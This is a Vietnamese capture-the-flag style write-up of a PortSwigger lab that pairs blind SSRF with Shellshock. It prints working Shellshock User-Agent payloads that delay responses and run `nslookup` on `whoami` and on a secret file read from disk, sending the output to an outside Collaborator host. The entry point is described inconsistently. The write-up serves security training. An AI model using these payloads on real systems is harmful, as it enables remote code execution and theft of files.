![[ssrf-shellshock.png]]
-mô tả lab: chức năng feedback gửi User-Agent vào hệ thống nội bộ chạy bash cũ dính Shellshock. Mình RCE qua User-Agent rồi exfil về Collaborator. Bài khoai, cần Collaborator.

> [!NOTE]
> -Lab: https://portswigger.net/web-security/ssrf/blind/lab-shellshock (blind SSRF + Shellshock)
> -kịch bản: submit feedback -> server nội bộ xử lý với bash -> mình nhét `() { :; };` vào User-Agent

### hướng giải
- [ ] mình submit feedback bình thường, không thấy gì lạ (blind hoàn toàn, không response khác)
- [ ] mình thử đổi `stockApi` thì không có tham số này ở lab này; entry point ở đây là form feedback + header User-Agent
- [ ] mình thử User-Agent `() { :; }; sleep 10`, sau đó quan sát thời gian phản hồi, mình thấy delay đúng 10s -> dính Shellshock thật
- [ ] => mình RCE được nhưng blind, nên mình dùng `nslookup`/`curl` bắn dữ liệu về collaborator

### giải
-bước 1: confirm Shellshock bằng delay:
```
POST /product/stock HTTP/1.1 (hoặc /feedback)
User-Agent: () { :; }; sleep 10
-> response chậm đúng ~10s
```
![[ssrf-shellshock-delay.png]]

-bước 2: exfil file/variable về collaborator:
```
User-Agent: () { :; }; nslookup $(whoami).COLLAB.oastify.com
User-Agent: () { :; }; nslookup $(cat /home/carlos/secret).COLLAB.oastify.com
```
-sau khi quan sát log collaborator này, mình thấy subdomain `peter.COLL...` rồi `SECRET....COLL...` -> lượm được secret của carlos.

-bước 3: dùng secret/objective lab yêu cầu (vd login carlos / xóa user) là solve.

> [!NOTE]
> -bài học của mình: blind SSRF mà thấy server xử lý input bằng tiến trình hệ thống (fetch, convert, mail...) thì nghĩ ngay tới command injection thứ cấp như Shellshock. User-Agent là chỗ ít ai để ý nhất.
> -mẹo của mình: luôn confirm bằng sleep trước, rồi mới exfil, và exfil từng mảnh ngắn vì DNS label giới hạn 63 ký tự.
